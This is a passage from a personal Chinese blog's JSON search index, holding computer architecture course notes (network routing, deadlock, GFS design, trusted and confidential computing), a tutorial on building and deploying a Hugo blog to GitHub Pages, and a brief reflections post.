cost\n易于布线\n根节点将成为瓶颈，但Fat Tree能解决这个问题\n超立方 Hypercube\n“N-dimensional cube” or “N-cube” Latency: O(logN) links: O(NlogN) Low latency Hard to lay out in 2D/3D 多级网络Multistage Networks\nIndirect networks with multiple layers of switches between terminals/nodes\n成本: O(NlogN)， 延迟：O(logN) Many variations (Omega, Butterfly, Benes, Banyan, …) 路由Routing 路由算法（三种类型）\n确定性路由 Deterministic：所有相同的源-目标对选择相同路径\n简单 无死锁 可能会有高竞争 不能利用路径多样性 流量无关路由 Oblivious：选择不同的路径，无需考虑网络状态\nValiant 算法： An example of oblivious algorithm 目标: Balance network load 基础思路: Randomly choose an intermediate destination,route to it first, then route from there to destination Randomizes/balances network load Non minimal (packet latency can increase) Optimizations: Do this on high load Restrict the intermediate node to be close (in the same quadrant) 无缓冲偏转路由 Bufferless Deflection Routing\nKey idea: Packets are never buffered in the network. When two packets contend for the same link, one is deflected Input buffers are eliminated: packets are buffered in pipeline latches and on network links 自适应路由 Adaptive：能选择不同的路径，适应网络的状态\n最小化自适应路由 Minimal adaptive Router uses network state (e.g., downstream buffer occupancy) to pick which “productive” output port to send a packet to Productive output port: port that gets the packet closer to its destination Aware of local congestion Minimality restricts achievable link utilization (load balance) 非最小化方案 Non-minimal (fully) adaptive “Misroute” packets to non-productive output ports based on network state Can achieve better network utilization and load balance Need to guarantee livelock freedom 死锁问题 Deadlock\n没有转发进程 No forward progress 由资源的循环依赖所导致 Caused by circular dependencies on resources 每个包都等待另一个包释放所占有的缓冲区 Each packet waits for a buffer occupied by another packet downstream 解决方案\n在路由中避免循环 Avoid cycles in routing\n维度顺序路由 Dimension order routing Cannot build a circular dependency 转向记录与限制 Restrict the “turns” each packet can take 加缓冲 Avoid deadlock by adding more buffering (escape paths)\n监测和打破死锁 Detect and break deadlock\n可抢占缓冲区 Preemption of buffers 转向模型 Turn Model to Avoid Deadlock\nIdea 分析数据包在网络中可以转向的方向 Analyze directions in which packets can turn in the network 确定这些转向可以形成的循环 Determine the cycles that such turns can form 禁止足够数量的转向以阻止可能的循环 Prohibit just enough turns to break possible cycles 流量控制 Buffering and Flow Control 流量控制的基础思路\nCircuit switching Bufferless (Packet/flit based) Store and forward (Packet based) Virtual cut through (Packet based) Wormhole (Flit based) 十一、仓库级计算机和分布式文件系统 Warehouse-scale computer (WSC) Provides Internet services Search, social networking, online maps, video sharing, online hopping, email, cloud computing, etc. Differences with HPC “clusters”:\nClusters have higher performance processors and network Clusters emphasize thread-level parallelism, WSCs emphasize request-level parallelism Differences with datacenters:\nDatacenters consolidate different machines and software intoone location\nDatacenters emphasize virtual machines and hardware heterogeneity in order to serve varied customers\nWSC的分布式系统和软件\n编程框架Program Framework：MapReduce（Google）\n文件系统File systems: GFS（Google）\n数据库Database: Dynamo（Amazon） 、BigTable（Google）、Haystack（Facebook）\n缓存系统Cache：Memcache（@Facebook）\nGoogle WSC “三驾马车”：MapReduce、bigTable、GFS，其开源版本：Hadoop、Hbase（Java）、HDFS\n分布式文件系统 GFS系统架构\nGFS中有三种节点：GFS client，GFS master，GFS chunkserver GFS client：维持专用接口，与应用交互 GFS master：维持元数据，统一管理chunk位置与租约 GFS chunkserver：存储数据 GFS存储设计\n考虑到Google业务需要存储的文件(几个GB)可能非常大，并且大小不均，GFS没有选择直接以文件为单位进行存储，而是把文件分为一个个的chunk来存储，每个chunk为64MB 较大的chunk可以有效减少系统内部的寻址和交互次数 较大的chunk也意味着client可能在一个chunk上执行多次操作，这样可以服用TCP连接，节省网络开销 更大的chunk也可以减少chunk的数量，从而节省元数据存储开销，相当于节省了系统内最珍贵的内存资源 系统通过分割存储来将文件分散存储在多台服务器上 采用更大的chunk以及配套的一致性策略来支持大文件存储 GFS的Master设计\nGFS采用单Master节点，用来存储整个文件系统的三类元数据\n所有文件和chunk的namespace【持久化】 文件到chunk的映射【持久化】 每个chunk的位置【不持久化】 为什么位置不需要持久化，因为master在重启的时候可以从各个chunkserver处收集chunk的位置信息 GFS采取的一系列措施来确保master不会成为整个系统的瓶颈\nGFS所有的数据流不经过Master，而是直接由client和chunkserver直接交互（数据流和控制流分离） GFS的client会缓存master的元数据，在大部分情况下，都无需访问master 采取一系列手段来节省master的内存，包括增大chunk的大小以节省chunk的数量、对元数据进行定制化的压缩等 如何实现自动扩缩容？\u0026ndash;\u0026gt;在master节点上增减、调整chunk的元数据即可\n怎样知道一个文件存储在哪台机器上？\u0026ndash;\u0026gt;根据master中文件到chunk再到chunk位置的映射来定位具体的chunkserver\n考试重点，题目应该是64B，打错了\nGFS的高可用设计\nmaster的高可用设计\n除了primary master以外，还维持一个shadow master作为备份master master在正常运行时，对元数据所做的所有修改操作，都要先记录日志(WAL)，再真正去修改内存中的元数据 同时primary master会实时向shadow master同步WAL，只有shadow master同步日志完成，元数据修改操作才算成功 如何实现自动切换\n如果master宕机，会通过Google的Chubby(本质时共识算法)来识别并切换到shadow master，这个切换时秒级的 chunk的高可用设计\n文件被拆为一个个的chunk来进行存储的，每个chunk都有三个副本，由master维持副本信息 对一个chunk的每次写入都必须保证在三个副本中的写入都完成，才算写入完成 如果一个chunkserver宕机，还有两个副本保存这个chunk的信息 如果宕机的副本在一段时间后没有恢复，那么master会在另一个chunksever重建一个副本，从而将chunk的副本数目维持在3个 master对副本位置的选择策略要遵循以下三点 新副本所在的chunkserver的资源利用率要低 新副本所在的chunkserver最近创建的chunk副本不多，防止其瞬间成为热点 不能和chunk其它副本在同一机架 GFS的读写流程\nGFS的写入\n采用流水线技术 数据流与控制流分离的技术 GFS的写入流程\n1,2.Client向Master询问要写入chunk的租约在哪个chunkserve上(Primary Replica)，以及其他副本(Secondary Replicas)的位置(通常Client中直接就有缓存) 3.Client将数据推送到所有的副本上，这一步就会用到流水线技术，也是写入过程中唯一的数据流操作。 4.确认所有副本都收到了数据之后，client发送正式写入的请求到Primary Replica。Primary Replica接收到这个请求后，会对这个Chunk上所有的操作排序，然后按照顺序执行写入。 这里很关键，Primary Replica唯一确定写入顺序，保证副本一致性。\n5.Primary Replica把Chunk写入的顺序同步给SecondaryReplica。 注意，如果执行到这一步，Primary Replica上写入已经成功了.\n6.所有的Secondary Replica返回Primary Replica写入完成·7.Primary Replica返回写入结果给Client。 所有副本都写入成功: Client确认写入完成\n一部分Secondary Replica写入失败 (没有响应) :Client认为写入失败，并从第3步开始重新执行。\n如果一个写入操作涉及到多个chunk，client会把它们分为多个写入来执行。\n改写的问题在于一个改写操作可能涉及到多个chunk而如果部分chunk成功，部分chunk失败，我们读到的文件就是不正确的。\n改写大概率是一个分布式操作，如果要保证改写的强致性，代价就要大很多了。论文中一再强调，GFS推荐使用追加的方式写入文件并且Google内部使用GFS的应用，它们的绝大多数写入也都是追加。\nGFS的读取流程\nclient收到读取一个文件的请求后，首先会查看自身的缓存中有没有此文件的元数据信息。如果没有，则请求master(或shadow master)获取元数据信息并缓存。 client计算文件偏移量对应的chunk。 然后client向离自身最近的chunkserver发送读请求。如果在这个过程中，发现这个chunkserver没有自己所需的chunk，说明缓存失效，就再请求master获取最新的元数据 读取时会进行chunk校验和的确认如果校验和验证不通过，选择其他副本进行读取 Client返回应用读取结果 总体上GFS是三写一读的模式。写入采用了流水线技术和数据流与控制流分离技术保证性能;追加对一致性的保证更简单，也更加高效，所以写入多采用追加的形式。读取则所有副本都可读在就近读取的情况下性能非常高\nGFS的一致性模型\nGFS把文件数据的一致性大体上分为三个层次：inconsistent，consistent，defined\nconsistent：一致的，表示文件无论从哪个副本读取，结果都是一样的 defined：已定义的，文件发生修改操作后，读取时一致的，且client可以看到最新修改的内容 串行改写成功: defined。因为所有副本都完成改写后才能返回成功，并且重复执行改写也不会产生副本间不一致，所以串行改写成功数据是defined。\n写入失败:inconsistent。这通常发生在重试了一定次数仍无法在所有副本都写入成功时意味着大概率有个副本宕机了，这种情况下一定是不一致的，Client也不会返回成功。\n并发改写成功: consistent but undefined。对于单个改写操作而言，成功就意味着副本间是一致的。但并发改写操作可能会涉及多个chunk，不同chunk对改写的执行顺序不一定相同，而这有可能造成应用读取不到预期的结果。\n追加写成功: defined interspersed with inconsistent (已定义但有可能存在副本间不一致interspersed with inconsistent，追加的重复执行会造成副本间的不一致。\nNoSQL数据库 BigTable 分布式编程框架MapRedue**** 数据中心网络Data Center Networks 云计算安全 安全计算模式一：可信计算\n可信计算的含义\n可信计算组织TCG：如果一个实体的行为是以预期的方式，符合预期的目标，则该实体是可信的 ISO/IEC 15408标准：参与计算的组件、操作或过程在任意的条件下是可预测的，并能够抵御病毒和一定程度的物理干扰 沈昌祥院士：可信≈安全+可靠，可信计算系统是能够提供系统的可靠性、可用性、信息和行为安全性的计算机系统 工作原理\n建立信任根：信任根的可信性由物理安全、技术安全与管理安全共同确保 建立信任链：从信任根开始到硬件平台，到操作系统再到应用，一级认证一级，一级信任一级 局限性\n可信计算对数据的保护偏弱，仅限密钥和关键数据\n安全计算模式二：机密计算\n机密计算的定义\nIBM：机密计算是一种云计算技术，它在处理过程中将敏感数据隔离在受保护的CPU Enclave中 机密计算联盟CCC：机密计算是通过在基于硬件可信执行环境中执行计算来保护使用中的数据 冯登国院士：机密计算是一种保护使用中的数据安全的计算范式 工作原理\n机密计算利用基于硬件的可信执行环境将数据、特定功能或整个应用程序与操作系统、虚拟机管理程 序、虚拟机管理器以及其他特权进程隔离开来，从而保护敏感数据 局限性\n机密计算支撑技术SGX等存在侧信道攻击，依赖对硬件厂商的信任，且机密计算缺乏统一的技术标准 可信执行环境TEE\nTEE 是一种具有运算和储存功能，能提供安全性和完整性保护的独立处理环境\n在硬件中为敏感数据单独分配一块隔离的内存，所有敏感数据的计算均在这块内存中进行\n安全计算模式三：密态计算\n以密文为计算对象，其安全性不依赖于隔离和访问控制、不依赖于硬件和软件安全性\n","date":"2023-12-26T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1_hu6408142527681263189.jpg","permalink":"https://chenyuan1125.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/","title":"计算机体系结构课程笔记"},{"content":"Hugo介绍 Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。\nHugo中文文档地址： https://www.gohugo.org\nHugo安装 下载地址：https://github.com/gohugoio/hugo/releases\n找到对应系统的下载文件(win10为例，建议选择extended版本，有些主题需要extended版本才能正常使用)\n建立blog文件夹，并将下载好的zip文件解压到该文件夹下(建议不要有中文和空格)\n再将hogu.exe的路径添加到环境变量中(不会则请STFW)\n在cmd中查看命令是否成功\n1 2 3 4 5 输入下面命令查看是否成功 $ hugo version 输出结果： Hugo Static Site Generator v0.68.3/extended windows/amd64 BuildDate: unknown 说明安装成功 设置站点\n1 hugo new site myBlog 生成myblog文件夹\nHugo主题下载 官方网址：https://www.gohugo.org/theme/\n我这里下载的是：CaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers (github.com)\n建议安装方法：\n将下载好的主题解压放入之前new出来的文件夹(我这里是myblog)文件夹下的themes下\n并在myblog/config.toml里加一行 theme=xxxx（解压后的主题文件夹的名称）\n把主题中的config.yaml或toml文件复制放到myblog文件夹下\n启动站点\n1 hugo server 请注意倒数第二行（ Web Server is available at //localhost:1313/ (bind address 127.0.0.1) ）说明启动成功了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Building sites … WARN 2020/04/07 17:51:51 Markup type mmark is deprecated and will be removed in a future release. See https://gohugo.io//content-management/formats/#list-of-content-formats | EN -------------------+----- Pages | 74 Paginator pages | 0 Non-page files | 21 Static files | 8 Processed images | 28 Aliases | 14 Sitemaps | 1 Cleaned | 0 Built in 1103 ms Watching for changes in F:\\blog\\myBlog\\{archetypes,content,data,layouts,static,themes} Watching for config changes in F:\\blog\\myBlog\\config.toml, F:\\blog\\myBlog\\config\\_default Environment: \u0026#34;development\u0026#34; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at //localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop 在浏览器中输入 localhost:1313，就可以看到效果了\n注意事项：如果启动站点失败，可以先将主题删除，再启动站点，看是否报错，若没报错则是主题配置问题。\n创建文章 创建第一篇文章，放到 post 目录，方便之后生成聚合页面。(注意命名时不可以空格，可以用-代替)\n1 hugo post/first.md 然后就可以使用 hugo server 来查看效果啦！\n(注意：如果没出现新文章，则可能开启了draft模式，使用hogu server -D)\n部署到服务器 我们将使用github.io来代替服务器以及域名：推荐参考教程\n几个注意事项：\nGit要上传或执行的文件可以在文件夹中，右键空白地区点git bash here从而实现目录内操作。 在linux操作中（比如git）粘贴操作是shift+insert或单击鼠标的滚轮。而复制只要选中即可。 github的域名地址与用户名必须一致，比如你的github名字叫sakura，那么域名必须是sakura.github.io。 hugo命令 hugo --baseURL=\u0026quot;https://你的github名字.github.io/\u0026quot;执行完后，会生成一个public文件夹。 用git推送的时候 git pull --rebase origin master语句可能会出错显示没有文件，不用担心，这是因为此时目标仓库是空的，直接下一步最后，你只需要输入对应网址，即可看到博客了！ 如果想将默认语言设置为中文，只要在config中设置一下defaultContentLanguage=\u0026ldquo;zh-cn\u0026quot;就行了，但可能会不生效，最好将其放在config.toml的第一行 更新博客 在博客目录下使用 hugo \u0026ndash;BaseURL=\u0026ldquo;https://你的github名字.github.io/\u0026ldquo;覆盖原来的public文件夹\n1 hugo --BaseURL=\u0026#34;https://chenyuan1125.github.io\u0026#34; 进入public文件夹右键git bash 分别执行\n1 2 3 git add . git commit -m ‘first commit’ git push origin master 可能存在的问题：\ngithub上存放文件的仓库是否只有一个分支（创建时不要勾选生成README.md) 正常public上传github仓库后会只有一个分支，且包含了public内的所有文件 文章看不到,检查是否格式正确，使用了hugo new xxxx.md,检查是否包含了 draft: true，若有则删除或使用 hugo server -D，若草稿模式开启是看不到文章的 git push不成功,此时大概率是网络通信有问题，可以关掉git终端后科学上网；重启git 终端后（windows需要，linux系统不需要）再进行push大概率就可以解决问题了；此时无需再进行git init 等初始化操作因为之前已经做完。 添加评论功能 可参考这篇博客：使用vercel搭建属于自己的waline评论系统 | 叉七的叨叨哔 (xseven.top)\n如果评论无法正常显示，则可能是引文vercel.app被DNS污染导致无法使用，需要自行配置域名，具体解决方案可查看这篇博客。\nWaline国内IP无法评论的解决方案(LeanCloud国际版/Vercel) | 泉子的理想乡 (izumi.vip)\n参考资料 从零到一，用 Hugo 打造你的个人网站 (brume.top)\n如何用 GitHub Pages + Hugo 搭建个人博客 · KrislinBlog (krislinzhao.github.io)\n","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu13415945946882854451.jpg","permalink":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","title":"个人博客搭建"},{"content":"随想录 一些很好的话 世界上没有直路，要准备走曲折的路。 只要我不放弃的话缘分就会一直下去。 躺平有时，奋斗又是，发疯有时，理性有时，但最终我们依然向往的是一种正向的东西，而不是一种虚伪的东西。 ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/1_hu17545487328256898304.jpg","permalink":"https://chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/","title":"随想录"}]